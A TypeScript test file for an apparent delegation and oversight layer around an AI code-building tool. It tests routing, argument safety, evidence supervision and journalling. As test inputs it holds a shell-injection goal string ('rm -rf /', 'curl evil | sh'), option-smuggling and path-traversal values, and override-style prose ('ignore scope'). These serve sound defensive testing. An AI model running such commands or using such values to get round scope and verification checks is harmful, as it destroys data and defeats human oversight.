import assert from 'node:assert/strict';
import { appendFileSync } from 'node:fs';
import { join } from 'node:path';
import test from 'node:test';

import { governedMkdtemp } from '../temp-authority.js';
import { selectRoute, withinAuthorizedScope, type WorkRequest } from './route.js';
import { buildIkbiArgv, IkbiAdapterRefusal, assertRelativePath, type IkbiInvocation } from './ikbi-adapter.js';
import { superviseSession } from './supervisor.js';
import { DelegationJournal, type DelegationRecord } from './journal.js';

const ROOTS = ['/pehverse/repos', '/home/zen/.pehverse/phase4-fixtures'];
const req = (over: Partial<WorkRequest> = {}): WorkRequest => ({
  goal: 'irrelevant to routing', mutates: true, repository: '/pehverse/repos/demo',
  allowedPaths: ['src/a.js'], checks: [{ name: 'unit', command: 'node', args: ['--test'] }], ...over,
});

// ── ROUTE SELECTION ───────────────────────────────────────────────────────────────────────────

test('POSITIVE: read-only work stays DIRECT — delegation is not the default', () => {
  const d = selectRoute(req({ mutates: false }), ROOTS);
  assert.equal(d.route, 'DIRECT');
  assert.equal(d.reason, 'no_mutation_required');
});

test('POSITIVE: a fully authorized implementation goes to IKBI', () => {
  const d = selectRoute(req(), ROOTS);
  assert.equal(d.route, 'IKBI');
  assert.equal(d.reason, 'governed_implementation');
});

test('local assist is NOT always selected — it is opt-in per request', () => {
  assert.equal(selectRoute(req(), ROOTS).route, 'IKBI');
  assert.equal(selectRoute(req({ localAnalysisUseful: true }), ROOTS).route, 'IKBI_WITH_LOCAL_ASSIST');
  assert.equal(selectRoute(req({ localAnalysisUseful: false }), ROOTS).route, 'IKBI');
});

test('implementation work does NOT remain direct just because it is small', () => {
  // One file, one check — still a repository mutation, so still governed.
  const d = selectRoute(req({ allowedPaths: ['src/one-liner.js'] }), ROOTS);
  assert.equal(d.route, 'IKBI');
});

test('FAIL CLOSED: each missing authority refuses, and names which one', () => {
  for (const [over, reason] of [
    [{ repository: undefined }, 'repository_missing'],
    [{ repository: '   ' }, 'repository_missing'],
    [{ repository: '/etc' }, 'repository_outside_authorized_scope'],
    [{ allowedPaths: [] }, 'mutation_scope_missing'],
    [{ allowedPaths: ['  '] }, 'mutation_scope_missing'],
    [{ checks: [] }, 'acceptance_criteria_missing'],
  ] as const) {
    const d = selectRoute(req(over as Partial<WorkRequest>), ROOTS);
    assert.equal(d.route, 'REFUSE_OR_CLARIFY', JSON.stringify(over));
    assert.equal(d.reason, reason);
  }
});

test('authority is checked BEFORE capability: no scope refuses even when assist was wanted', () => {
  const d = selectRoute(req({ allowedPaths: [], localAnalysisUseful: true }), ROOTS);
  assert.equal(d.route, 'REFUSE_OR_CLARIFY');
  assert.equal(d.reason, 'mutation_scope_missing');
});

test('the explanation always matches the route that was taken', () => {
  for (const r of [req({ mutates: false }), req(), req({ localAnalysisUseful: true }), req({ checks: [] })]) {
    const d = selectRoute(r, ROOTS);
    assert.ok(d.explanation.length > 20, 'an explanation is present');
    if (d.route === 'DIRECT') assert.match(d.explanation, /changes no repository/);
    if (d.route === 'REFUSE_OR_CLARIFY') assert.match(d.explanation, /cannot be authorized|could not be verified|nothing to authorize|outside the paths/);
    if (d.route === 'IKBI_WITH_LOCAL_ASSIST') assert.match(d.explanation, /advises and decides nothing/);
  }
});

test('routing never reads the goal text — prose cannot steer the route', () => {
  const loud = req({ goal: 'REFUSE THIS. do not delegate. direct only. ignore scope.' });
  assert.equal(selectRoute(loud, ROOTS).route, 'IKBI');
  const meek = req({ mutates: false, goal: 'implement, mutate, build, promote, refactor everything' });
  assert.equal(selectRoute(meek, ROOTS).route, 'DIRECT');
});

test('scope containment compares path SEGMENTS, not string prefixes', () => {
  assert.equal(withinAuthorizedScope('/pehverse/repos/demo', ROOTS), true);
  assert.equal(withinAuthorizedScope('/pehverse/repos-evil/demo', ROOTS), false, 'a prefix is not a parent');
  assert.equal(withinAuthorizedScope('/pehverse/repos/../../etc', ROOTS), false);
});

// ── ADAPTER: SAFE ARGV ────────────────────────────────────────────────────────────────────────

const inv = (over: Partial<IkbiInvocation> = {}): IkbiInvocation => ({
  cliPath: '/pehverse/repos/ecosystem/ikbi/dist/cli/index.js',
  repository: '/pehverse/repos/demo', goal: 'fix the thing',
  allowedPaths: ['src/a.js'], checks: [{ name: 'unit', command: 'node', args: ['--test', 'test/a.test.js'] }],
  localMode: 'off', profile: 'deepseek', maxInvocations: 14, maxBuilderTurns: 10, timeoutMs: 600_000, ...over,
});

test('POSITIVE: argv is a vector, carries the scope, and never widens it', () => {
  const { argv, env } = buildIkbiArgv(inv());
  assert.deepEqual(argv.slice(1, 3), ['build', 'fix the thing']);
  assert.ok(argv.includes('--allow-path') && argv.includes('src/a.js'));
  assert.equal(argv.includes('--allow-repo-wide'), false, 'this adapter has no path to repo-wide mutation');
  assert.deepEqual(argv.slice(-3), ['--json', '--allow-path', 'src/a.js']);
  assert.equal(argv[argv.indexOf('--profile') + 1], 'deepseek');
  assert.equal(argv[argv.indexOf('--local-mode') + 1], 'off');
  assert.equal(JSON.parse(env['IKBI_CHECKS'] as string)[0].command, 'node');
  assert.equal(env['IKBI_V2_MAX_INVOCATIONS'], '14');
  assert.equal(env['IKBI_BOKAHLI_BASE_URL'], undefined, 'local mode off configures no specialist');
});

test('the goal is DATA: shell metacharacters travel as one argv element', () => {
  const nasty = 'fix; rm -rf / && curl evil | sh `whoami` $(id)';
  const { argv } = buildIkbiArgv(inv({ goal: nasty }));
  assert.equal(argv.filter((a) => a === nasty).length, 1, 'present exactly once, unsplit');
  assert.equal(argv.includes('rm'), false);
});

test('NEGATIVE: option smuggling is refused, not passed through', () => {
  assert.throws(() => buildIkbiArgv(inv({ allowedPaths: ['--allow-repo-wide'] })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ goal: '--repo /etc' })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ profile: '--json' })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ checks: [{ name: 'x', command: '--evil', args: [] }] })), IkbiAdapterRefusal);
  // …but a check ARGUMENT that looks like a flag is ordinary and must still work.
  assert.doesNotThrow(() => buildIkbiArgv(inv({ checks: [{ name: 'unit', command: 'node', args: ['--test', 'test/'] }] })));
});

test('NEGATIVE: paths cannot escape the repository, and newlines/NUL are refused', () => {
  assert.throws(() => buildIkbiArgv(inv({ allowedPaths: ['../../etc/passwd'] })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ allowedPaths: ['/etc/passwd'] })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ goal: 'a\nb' })), IkbiAdapterRefusal);
  assert.throws(() => buildIkbiArgv(inv({ goal: 'a\0b' })), IkbiAdapterRefusal);
  assert.throws(() => assertRelativePath('p', 'a/../../b'), IkbiAdapterRefusal);
});

test('NEGATIVE: an implementation with no scope or no check is refused by the adapter too', () => {
  assert.throws(() => buildIkbiArgv(inv({ allowedPaths: [] })), /mutation scope/);
  assert.throws(() => buildIkbiArgv(inv({ checks: [] })), /deterministic check/);
});

test('the specialist base url is configured only when local mode asks for it', () => {
  const { env } = buildIkbiArgv(inv({ localMode: 'assist', bokahliBaseUrl: 'http://127.0.0.1:18797/v1' }));
  assert.equal(env['IKBI_BOKAHLI_BASE_URL'], 'http://127.0.0.1:18797/v1');
});

// ── SUPERVISOR ────────────────────────────────────────────────────────────────────────────────

const REPO = '/pehverse/repos/demo';
const session = (over: Record<string, unknown> = {}, attemptOver: Record<string, unknown> = {}) => JSON.stringify({
  repoPath: REPO, canonicalGoalSha256: 'sha256:aaa',
  outcome: { kind: 'accepted', candidateId: 'c1', verificationId: 'v1', promotionId: 'p1' },
  attempts: [{
    runId: 'run_1',
    verification: { verdict: 'pass', checks: [{ name: 'unit', status: 'pass', exitCode: 0 }] },
    candidate: { changedPaths: ['src/a.js'], claim: { believesComplete: true } },
    ...attemptOver,
  }],
  localAdvisories: [], ...over,
});

test('POSITIVE: verified and promoted is the only thing read as completion', () => {
  const j = superviseSession(session(), { repository: REPO }, 0);
  assert.equal(j.verdict, 'COMPLETED_VERIFIED_PROMOTED');
  assert.deepEqual(j.changedPaths, ['src/a.js']);
  assert.equal(j.promotionId, 'p1');
});

test('exit 0 does NOT decide: a red verification is still red', () => {
  const red = session({ outcome: { kind: 'rejected', reason: 'verification_red', candidateId: 'c1' } });
  const j = superviseSession(red, { repository: REPO }, 0);
  assert.equal(j.verdict, 'VERIFICATION_RED');
});

test("a model's believesComplete does not survive contact with the verification record", () => {
  const contradiction = session(
    { outcome: { kind: 'accepted', candidateId: 'c1', verificationId: 'v1', promotionId: 'p1' } },
    { verification: { verdict: 'fail', checks: [{ name: 'unit', status: 'fail', exitCode: 1 }] },
      candidate: { changedPaths: ['src/a.js'], claim: { believesComplete: true } } });
  const j = superviseSession(contradiction, { repository: REPO }, 0);
  assert.equal(j.verdict, 'EVIDENCE_REJECTED');
  assert.match(j.explanation, /contradicts itself/);
});

test('a verified candidate with no promotion awaits the operator — not a failure, not a completion', () => {
  const j = superviseSession(session({ outcome: { kind: 'accepted', candidateId: 'c1', verificationId: 'v1' } }), { repository: REPO }, 0);
  assert.equal(j.verdict, 'PROMOTION_REFUSED_AWAITING_OPERATOR');
});

test('provider, policy, timeout and unknown failures are told apart', () => {
  const f = (failure: Record<string, unknown>) =>
    superviseSession(session({ outcome: { kind: 'failed', failure } }), { repository: REPO }, 1).verdict;
  assert.equal(f({ category: 'provider', code: 'invocation.credential_missing' }), 'PROVIDER_FAILURE');
  assert.equal(f({ category: 'policy', code: 'policy.cost_unpriced_model_under_budget' }), 'REFUSED_BEFORE_EXECUTION');
  assert.equal(f({ category: 'execution', code: 'run.timeout' }), 'TIMEOUT_OR_INTERRUPTED');
  assert.equal(f({ category: 'execution', code: 'weird' }), 'INDETERMINATE');
});

test('STALE / WRONG BINDING: evidence for another repo, goal, or run is rejected', () => {
  assert.equal(superviseSession(session(), { repository: '/pehverse/repos/other' }, 0).rejection, 'repository_mismatch');
  assert.equal(superviseSession(session(), { repository: REPO, goalSha256: 'sha256:bbb' }, 0).rejection, 'goal_digest_mismatch');
  assert.equal(superviseSession(session(), { repository: REPO, runId: 'run_99' }, 0).rejection, 'run_id_mismatch');
});

test('malformed or empty evidence is rejected, never optimistically parsed', () => {
  assert.equal(superviseSession('not json', { repository: REPO }, 0).rejection, 'session_json_malformed');
  assert.equal(superviseSession('[]', { repository: REPO }, 0).rejection, 'session_json_malformed');
  assert.equal(superviseSession(JSON.stringify({ repoPath: REPO, attempts: [] }), { repository: REPO }, 0).rejection, 'attempt_missing');
  assert.equal(superviseSession(JSON.stringify({ repoPath: REPO, attempts: [{ runId: 'r' }] }), { repository: REPO }, 0).rejection, 'no_terminal_outcome');
});

test('a successful run for a DIFFERENT task cannot satisfy this one (replay)', () => {
  const previous = session({ canonicalGoalSha256: 'sha256:previous-task' });
  const j = superviseSession(previous, { repository: REPO, goalSha256: 'sha256:this-task' }, 0);
  assert.equal(j.verdict, 'EVIDENCE_REJECTED');
});

test('local advisory facts are reported exactly, including a discarded one', () => {
  const withAdvice = session({ localAdvisories: [
    { hook: 'PRE_BUILD_RECON', taskClass: 'repo_recon_bounded', mode: 'assist', outcome: 'ROUTED', disposition: 'discarded', suppliedToPrimaryProvider: false },
    { hook: 'POST_CANDIDATE_DIFF_SUMMARY', taskClass: 'diff_summarization', mode: 'assist', outcome: 'ROUTED', disposition: 'accepted', suppliedToPrimaryProvider: false },
  ] });
  const j = superviseSession(withAdvice, { repository: REPO }, 0);
  assert.equal(j.bokahliInvoked, true);
  assert.equal(j.humanReviewRequired, true);
  assert.equal(j.localAdvisories[0]?.disposition, 'discarded');
  assert.equal(j.localAdvisories.every((a) => a.suppliedToPrimaryProvider === false), true);
});

test('POSITIVE CONTROL: with local mode off there are no advisories and Bokahli is not claimed', () => {
  const j = superviseSession(session(), { repository: REPO }, 0);
  assert.equal(j.bokahliInvoked, false);
  assert.equal(j.humanReviewRequired, false);
  assert.deepEqual(j.localAdvisories, []);
});

// ── DURABLE JOURNAL ───────────────────────────────────────────────────────────────────────────

const rec = (over: Partial<DelegationRecord> = {}): DelegationRecord => ({
  schema: 'pehverse-trio-delegation/1', delegationId: 'd1', timestamp: 1,
  parentRequestId: 'req-1', principalId: 'operator-cli@ptah', agent: 'Ptah',
  goal: 'g', route: 'IKBI', routeReason: 'governed_implementation', routeExplanation: 'x',
  operatorState: 'completed', ...over,
});

test('a delegation is on disk before record() returns, and survives a new reader', () => {
  const dir = governedMkdtemp('deleg-');
  const path = join(dir, 'delegations.jsonl');
  new DelegationJournal(path).record(rec());
  // A brand-new instance is the restart: nothing is carried in memory.
  const after = new DelegationJournal(path);
  assert.equal(after.durable, true);
  assert.equal(after.all().length, 1);
  assert.equal(after.find('d1')?.verdict, undefined);
  assert.equal(after.find('d1')?.parentRequestId, 'req-1');
});

test('a restart does not turn interrupted work into success', () => {
  const dir = governedMkdtemp('deleg2-');
  const path = join(dir, 'delegations.jsonl');
  const j = new DelegationJournal(path);
  j.record(rec({ delegationId: 'd-interrupted', verdict: 'TIMEOUT_OR_INTERRUPTED', operatorState: 'incomplete' }));
  const reread = new DelegationJournal(path).find('d-interrupted');
  assert.equal(reread?.verdict, 'TIMEOUT_OR_INTERRUPTED');
  assert.notEqual(reread?.verdict, 'COMPLETED_VERIFIED_PROMOTED');
});

test('a torn final line loses only itself', () => {
  const dir = governedMkdtemp('deleg3-');
  const path = join(dir, 'delegations.jsonl');
  const j = new DelegationJournal(path);
  j.record(rec({ delegationId: 'a' }));
  j.record(rec({ delegationId: 'b' }));
  appendFileSync(path, '{"schema":"pehverse-trio-delegation/1","delegationId":"c"');
  const all = new DelegationJournal(path).all();
  assert.deepEqual(all.map((r) => r.delegationId), ['a', 'b']);
});

test('a foreign line is skipped rather than trusted', () => {
  const dir = governedMkdtemp('deleg4-');
  const path = join(dir, 'delegations.jsonl');
  const j = new DelegationJournal(path);
  appendFileSync(path, `${JSON.stringify({ schema: 'something-else/1', delegationId: 'x' })}\n`);
  j.record(rec({ delegationId: 'real' }));
  assert.deepEqual(new DelegationJournal(path).all().map((r) => r.delegationId), ['real']);
});

test('a cache-only journal reports that it is not durable', () => {
  const j = new DelegationJournal(undefined);
  assert.equal(j.durable, false);
  assert.deepEqual(j.all(), []);
});

// ── RUNNER: route → authority → evidence → verdict → durable record ───────────────────────────

const runnerCtx = (over: Partial<import('./runner.js').DelegationContext> = {}) => ({
  parentRequestId: 'req-9', principalId: 'operator-cli@ptah', agent: 'Ptah',
  authorizedRoots: ROOTS, ikbiCliPath: '/pehverse/repos/ecosystem/ikbi/dist/cli/index.js',
  profile: 'deepseek', readHeadCommit: () => 'commit-before',
  journal: new DelegationJournal(join(governedMkdtemp('run-'), 'd.jsonl')),
  clock: () => 42,
  ...over,
});

test('RUNNER: a DIRECT task is journalled and never spawns ikbi', async () => {
  const { runDelegation } = await import('./runner.js');
  let spawned = 0;
  const ctx = runnerCtx({ spawn: () => { spawned += 1; return { stdout: '', status: 0 }; } });
  const out = runDelegation(req({ mutates: false }), ctx as never);
  assert.equal(out.decision.route, 'DIRECT');
  assert.equal(spawned, 0, 'no governed build process was launched');
  assert.equal(out.judgment, undefined);
  assert.match(out.record.operatorState, /handled directly/);
  assert.equal(ctx.journal.all().length, 1, 'the decision is durable even when nothing was delegated');
});

test('RUNNER: a request with no mutation scope refuses without spawning', async () => {
  const { runDelegation } = await import('./runner.js');
  let spawned = 0;
  const ctx = runnerCtx({ spawn: () => { spawned += 1; return { stdout: '', status: 0 }; } });
  const out = runDelegation(req({ allowedPaths: [] }), ctx as never);
  assert.equal(out.decision.route, 'REFUSE_OR_CLARIFY');
  assert.equal(spawned, 0);
  assert.equal(ctx.journal.all()[0]?.route, 'REFUSE_OR_CLARIFY');
});

test('RUNNER: a promoted build is supervised and recorded with its evidence', async () => {
  const { runDelegation } = await import('./runner.js');
  const ctx = runnerCtx({ spawn: (argv: readonly string[]) => {
    assert.ok(argv.includes('--allow-path'), 'scope reached ikbi');
    assert.equal(argv[argv.indexOf('--local-mode') + 1], 'off');
    return { stdout: session(), status: 0 };
  } });
  const out = runDelegation(req({ repository: REPO }), ctx as never);
  assert.equal(out.judgment?.verdict, 'COMPLETED_VERIFIED_PROMOTED');
  const rec = ctx.journal.all()[0];
  assert.equal(rec?.verdict, 'COMPLETED_VERIFIED_PROMOTED');
  assert.equal(rec?.runId, 'run_1');
  assert.deepEqual(rec?.changedPaths, ['src/a.js']);
  assert.match(rec?.operatorState ?? '', /verified and promoted/);
});

test('RUNNER: exit 0 with wrong-repository evidence is recorded as rejected, not completed', async () => {
  const { runDelegation } = await import('./runner.js');
  const ctx = runnerCtx({ spawn: () => ({ stdout: session({ repoPath: '/pehverse/repos/somewhere-else' }), status: 0 }) });
  const out = runDelegation(req({ repository: REPO }), ctx as never);
  assert.equal(out.judgment?.verdict, 'EVIDENCE_REJECTED');
  assert.equal(out.judgment?.rejection, 'repository_mismatch');
  assert.match(ctx.journal.all()[0]?.operatorState ?? '', /does not belong to this request/);
});

test('RUNNER: assist selects local mode and reports the specialist honestly', async () => {
  const { runDelegation } = await import('./runner.js');
  const ctx = runnerCtx({ bokahliBaseUrl: 'http://127.0.0.1:18797/v1', spawn: (argv: readonly string[], env: Record<string, string>) => {
    assert.equal(argv[argv.indexOf('--local-mode') + 1], 'assist');
    assert.equal(env['IKBI_BOKAHLI_BASE_URL'], 'http://127.0.0.1:18797/v1');
    return { stdout: session({ localAdvisories: [
      { hook: 'PRE_BUILD_RECON', taskClass: 'repo_recon_bounded', mode: 'assist', outcome: 'ROUTED', disposition: 'discarded', suppliedToPrimaryProvider: false },
    ] }), status: 0 };
  } });
  const out = runDelegation(req({ repository: REPO, localAnalysisUseful: true }), ctx as never);
  assert.equal(out.decision.route, 'IKBI_WITH_LOCAL_ASSIST');
  assert.equal(out.judgment?.bokahliInvoked, true);
  assert.equal(out.judgment?.localAdvisories[0]?.disposition, 'discarded');
  assert.equal(ctx.journal.all()[0]?.bokahliInvoked, true);
});
